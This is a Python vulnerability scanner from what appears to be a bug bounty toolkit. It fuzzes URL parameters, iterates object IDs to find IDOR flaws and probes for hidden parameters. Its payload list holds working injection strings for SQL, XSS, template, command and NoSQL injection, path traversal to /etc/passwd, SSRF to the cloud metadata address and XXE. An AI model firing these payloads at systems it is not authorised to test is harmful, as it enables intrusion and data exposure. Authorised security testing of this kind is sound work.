#!/usr/bin/env python3
"""
param_fuzzer.py - Parameter Fuzzer & IDOR Tester
Bug Bounty Toolkit | @samsonram

Features:
  - GET/POST parameter fuzzing
  - IDOR via object ID iteration
  - Hidden parameter discovery
  - Response anomaly detection (size diff, status diff)
  - Supports cookie-based and Bearer token auth

Usage:
  python3 param_fuzzer.py -u "https://example.com/api/user?id=1" --idor
  python3 param_fuzzer.py -u "https://example.com/api/search?q=test" --fuzz -w wordlists/params.txt
  python3 param_fuzzer.py -u "https://example.com/api/user?id=1" --hidden-params
"""

import argparse
import requests
import urllib3
import json
import os
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from difflib import SequenceMatcher

urllib3.disable_warnings()

BASE_HEADERS = {"User-Agent": "Mozilla/5.0 (BugBounty-Fuzzer/1.0)"}

# ─── Helpers ──────────────────────────────────────────────────────────────────

def get_baseline(url: str, headers: dict) -> requests.Response | None:
    try:
        return requests.get(url, headers=headers, timeout=10, verify=False)
    except:
        return None

def similarity(a: str, b: str) -> float:
    return SequenceMatcher(None, a, b).ratio()

def replace_param(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))

# ─── IDOR Testing ─────────────────────────────────────────────────────────────

IDOR_IDS = list(range(1, 21)) + [100, 500, 999, 1000, 9999, 0, -1]

def test_idor(url: str, param: str, token: str = None, cookie: str = None) -> list[dict]:
    """
    Iterate a numeric parameter and flag when:
    - Different IDs return 200 with noticeably different content
    - IDs return data beyond expected scope
    """
    headers = {**BASE_HEADERS}
    if token:  headers["Authorization"] = f"Bearer {token}"
    if cookie: headers["Cookie"] = cookie

    findings = []
    print(f"\n[*] IDOR Test — param: '{param}' across {len(IDOR_IDS)} IDs")

    baseline = get_baseline(url, headers)
    baseline_body = baseline.text if baseline else ""
    baseline_size = len(baseline_body)

    results = {}
    def fetch_id(obj_id):
        test_url = replace_param(url, param, str(obj_id))
        try:
            r = requests.get(test_url, headers=headers, timeout=10, verify=False)
            return obj_id, r
        except:
            return obj_id, None

    with ThreadPoolExecutor(max_workers=10) as ex:
        futures = {ex.submit(fetch_id, i): i for i in IDOR_IDS}
        for f in as_completed(futures):
            obj_id, r = f.result()
            if r:
                results[obj_id] = {"status": r.status_code, "size": len(r.text), "body": r.text[:500]}

    # Analyze: flag IDs that return 200 with different content
    ok_results = {i: v for i, v in results.items() if v["status"] == 200}
    sizes = [v["size"] for v in ok_results.values()]
    avg_size = sum(sizes) / len(sizes) if sizes else 0

    for obj_id, data in ok_results.items():
        sim = similarity(baseline_body, data["body"])
        if sim < 0.7 or abs(data["size"] - baseline_size) > 200:
            findings.append({
                "type": "Potential IDOR",
                "severity": "HIGH",
                "param": param,
                "id": obj_id,
                "url": replace_param(url, param, str(obj_id)),
                "status": data["status"],
                "size": data["size"],
                "similarity_to_baseline": round(sim, 3),
                "detail": f"ID={obj_id} returns different content (similarity={round(sim,3)})",
            })
            print(f"  [!] ID={obj_id} => different response (sim={round(sim,3)}, size={data['size']})")

    if not findings:
        print(f"  [OK] No obvious IDOR — all IDs return similar responses")

    print(f"\n  Summary: {len(ok_results)} IDs returned 200, {len(findings)} flagged")
    return findings

# ─── Parameter Fuzzing ────────────────────────────────────────────────────────

FUZZ_PAYLOADS = [
    # SQLi
    "'", "''", "' OR '1'='1'--", "1 AND 1=1", "1 AND 1=2",
    # XSS
    "<script>alert(1)</script>", '"><svg onload=alert(1)>',
    # SSTI
    "{{7*7}}", "${7*7}", "<%= 7*7 %>",
    # Path traversal
    "../../../etc/passwd", "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    # Command injection
    "; ls -la", "| id", "& whoami",
    # NoSQL
    '{"$ne": null}', '{"$gt": ""}',
    # SSRF
    "http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/",
    # XXE indicator
    "<!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
    # Special chars
    "%00", "%0a", "%0d", "null", "undefined", "true", "false",
    # Large input
    "A" * 1000,
]

ERROR_SIGNALS = [
    "sql", "syntax error", "mysql", "ora-", "pg::", "sqlite",
    "traceback", "exception", "stack trace", "undefined method",
    "root:", "bin/bash",  # Path traversal hits
    "49",                  # SSTI 7*7=49
    "uid=",               # Command injection
    "access denied", "permission denied",
]

def fuzz_param(url: str, param: str, token: str = None, cookie: str = None) -> list[dict]:
    """Fuzz a single parameter with a variety of payloads."""
    headers = {**BASE_HEADERS}
    if token:  headers["Authorization"] = f"Bearer {token}"
    if cookie: headers["Cookie"] = cookie

    findings = []
    baseline = get_baseline(url, headers)
    baseline_status = baseline.status_code if baseline else 0
    baseline_size   = len(baseline.text)  if baseline else 0

    print(f"\n[*] Fuzzing param '{param}' with {len(FUZZ_PAYLOADS)} payloads")

    for payload in FUZZ_PAYLOADS:
        test_url = replace_param(url, param, payload)
        try:
            r = requests.get(test_url, headers=headers, timeout=8, verify=False)
        except:
            continue

        body_lower = r.text.lower()
        triggered  = [sig for sig in ERROR_SIGNALS if sig in body_lower]
        size_delta = abs(len(r.text) - baseline_size)

        if triggered or (r.status_code != baseline_status and r.status_code == 200 and size_delta > 300):
            vuln_type = "Unknown"
            if any(s in triggered for s in ["sql","mysql","ora-","syntax error","pg::","sqlite"]):
                vuln_type = "SQL Injection"
            elif "49" in triggered:
                vuln_type = "SSTI"
            elif "root:" in triggered or "bin/bash" in triggered:
                vuln_type = "Path Traversal / LFI"
            elif "uid=" in triggered:
                vuln_type = "Command Injection"
            elif "access denied" in triggered:
                vuln_type = "Authorization Issue"
            else:
                vuln_type = "Injection / Error Disclosure"

            finding = {
                "type": vuln_type,
                "severity": "HIGH",
                "param": param,
                "payload": payload,
                "url": test_url,
                "status_code": r.status_code,
                "size_delta": size_delta,
                "indicators": triggered,
            }
            findings.append(finding)
            print(f"  [!] {vuln_type} — payload: {payload[:40]} | signals: {triggered}")

    print(f"  Findings: {len(findings)}")
    return findings

# ─── Hidden Parameter Discovery ───────────────────────────────────────────────

COMMON_PARAMS = [
    "id", "user", "uid", "userid", "user_id", "account", "account_id",
    "admin", "debug", "test", "verbose", "token", "key", "api_key",
    "access", "role", "privilege", "mode", "action", "callback",
    "redirect", "url", "next", "return", "returnUrl", "dest",
    "file", "path", "dir", "page", "include", "template",
    "format", "output", "export", "type", "lang", "locale",
    "email", "username", "password", "name", "search", "query", "q",
    "sort", "order", "limit", "offset", "page", "per_page",
]

def discover_hidden_params(url: str, token: str = None, cookie: str = None) -> list[dict]:
    """
    Add common hidden parameters and detect response changes
    that might indicate server-side processing of those params.
    """
    headers = {**BASE_HEADERS}
    if token:  headers["Authorization"] = f"Bearer {token}"
    if cookie: headers["Cookie"] = cookie

    findings = []
    baseline = get_baseline(url, headers)
    if not baseline:
        return []
    baseline_size   = len(baseline.text)
    baseline_status = baseline.status_code

    print(f"\n[*] Discovering hidden parameters ({len(COMMON_PARAMS)} to check)...")

    def check_param(param):
        test_url = f"{url}{'&' if '?' in url else '?'}{param}=1"
        try:
            r = requests.get(test_url, headers=headers, timeout=8, verify=False)
            delta = abs(len(r.text) - baseline_size)
            status_changed = r.status_code != baseline_status
            if delta > 200 or status_changed:
                return {
                    "type": "Hidden Parameter Discovered",
                    "severity": "LOW",
                    "param": param,
                    "url": test_url,
                    "baseline_status": baseline_status,
                    "new_status": r.status_code,
                    "size_delta": delta,
                    "detail": f"Adding '{param}=1' changed response (size delta: {delta}, status: {baseline_status}->{r.status_code})",
                }
        except:
            pass
        return None

    with ThreadPoolExecutor(max_workers=15) as ex:
        for result in ex.map(check_param, COMMON_PARAMS):
            if result:
                findings.append(result)
                print(f"  [!] Hidden param found: '{result['param']}' (delta: {result['size_delta']})")

    if not findings:
        print("  [OK] No significant hidden parameters detected")
    return findings

# ─── Main ─────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="Parameter Fuzzer & IDOR Tester")
    parser.add_argument("-u", "--url",          required=True, help="Target URL with parameters")
    parser.add_argument("-p", "--param",                       help="Parameter to fuzz/test")
    parser.add_argument("-t", "--token",                       help="Bearer token")
    parser.add_argument("-c", "--cookie",                      help="Cookie header value")
    parser.add_argument("-o", "--output",       default="output", help="Output directory")
    parser.add_argument("--idor",               action="store_true", help="Run IDOR tests")
    parser.add_argument("--fuzz",               action="store_true", help="Run payload fuzzing")
    parser.add_argument("--hidden-params",      action="store_true", help="Discover hidden parameters")
    args = parser.parse_args()

    # Auto-detect params from URL if not specified
    parsed = urlparse(args.url)
    url_params = list(parse_qs(parsed.query).keys())
    param = args.param or (url_params[0] if url_params else "id")

    all_findings = []

    if args.idor or (not args.fuzz and not args.hidden_params):
        all_findings += test_idor(args.url, param, args.token, args.cookie)

    if args.fuzz:
        all_findings += fuzz_param(args.url, param, args.token, args.cookie)

    if args.hidden_params:
        all_findings += discover_hidden_params(args.url, args.token, args.cookie)

    # Save report
    os.makedirs(args.output, exist_ok=True)
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    out_path = os.path.join(args.output, f"fuzzer_report_{ts}.json")
    with open(out_path, "w") as f:
        json.dump({"target": args.url, "findings": all_findings}, f, indent=2)

    print(f"\n[+] {len(all_findings)} findings saved to {out_path}")

if __name__ == "__main__":
    main()
